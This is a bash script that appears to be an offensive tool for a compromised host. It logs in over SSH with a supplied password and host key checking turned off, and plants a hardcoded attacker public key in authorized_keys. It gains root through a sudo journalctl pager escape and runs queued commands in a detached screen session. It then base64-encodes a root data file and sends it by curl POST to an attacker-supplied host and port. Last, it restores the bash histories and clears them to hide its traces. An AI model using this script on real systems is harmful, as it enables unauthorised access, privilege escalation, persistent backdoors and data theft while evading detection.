HOST=$1
REVERSE_HOST=$2
REVERSE_PORT=$3
FILE_NAME=$4
PASSWORD=$5
root_file=/root/data
root_file_txt=${root_file}.txt
root_file_b64=${root_file}.b64
SCREEN_NAME=bashit

commands="id"

while read line
do
	commands="$commands;screen -S ${SCREEN_NAME} -p 0 -X stuff '"${line}^M"'"
done < commands_to_run.sh

#echo $commands

#sshpass -p "${PASSWORD}" ssh -oStrictHostKeyChecking=no ${HOST} -R ${REVERSE_PORT}:${REVERSE_HOST}:${REVERSE_PORT} << EOF

sshpass -p "${PASSWORD}" ssh -oStrictHostKeyChecking=no ${HOST} << EOF
cp ~/.bash_history ~/.bash_history.bkp
mkdir -p ~/.ssh/
key="ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDm2fFNI1HU7zS5/8WD9UIgMzvQsI5NwasmLtUcjbf6PM9cT6V1V1WPAoqK0YNuHasbMfZYAUca4pdrkEV2vNhYfhv96560toi8PKsEVP1iJEB2MFgr8C0tRKgopIfdYB9nW5mV9W95wkib8Q1qhN2FS/ifsKt51QdLT7a6dMnfmhmUgm8GA77M8v3MWgAocFK784phQXRBxyIF5Yor1KmcXTHzRSQ6JY4/Bzd7l5UZxRjRExZ3r0m4zhAwFDxFtzX9oiLekg/eBIDKhNNSdVWgSYoJNAJUbWjCPoimeAMXGqDdqslCWPKBuKdj3LuZI/L2MeVYisjwsWPYyJwMi3CtZr8JfrX5ThzgbXoihqO0no5+78EuZjZOLcwJy7ErrIa+jBmIa6pykZ/0VFFHGCoqiLAudT/dsKuGiX41PdZpCt9uolgIGDQ5IUgEHa3Op+rB4zn0gqqtnPKVyeKXDxsV7715ny0FRS1m4sNDfBKhVc3FPA8XMF1edbdaKBCb34M="
sed "s(\${key}((g" -i ~/.ssh/authorized_keys
echo \${key} >> ~/.ssh/authorized_keys
export TERM=xterm
SCREEN_NAME=${SCREEN_NAME}
screen -ls | grep -iw Detached | grep -w \${SCREEN_NAME} | cut -d. -f1 | awk '{print \$1}' | xargs kill
screen -dmS \${SCREEN_NAME}
screen -S \${SCREEN_NAME} -p 0 -X stuff "sudo \$(which journalctl)^M"
sleep 1
screen -S \${SCREEN_NAME} -p 0 -X stuff "\!/bin/bash^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "cp /root/.bash_history /root/.bash_history.bkp^M"

$commands
screen -S \${SCREEN_NAME} -p 0 -X stuff "cat ${root_file_txt} | base64 >> ${root_file_b64};^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "curl -X POST -i -F "filename=@${root_file_b64}" -F "name=${FILE_NAME}" ${REVERSE_HOST}:${REVERSE_PORT}/^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "rm ${root_file_txt}; rm ${root_file_b64}^M"
screen -S \${SCREEN_NAME} -p 0 -X stuff "mv /root/.bash_history.bkp /root/.bash_history; history -c && exit^M"
sleep 1
screen -X -S \${SCREEN_NAME}
mv ~/.bash_history.bkp ~/.bash_history
history -c && exit
EOF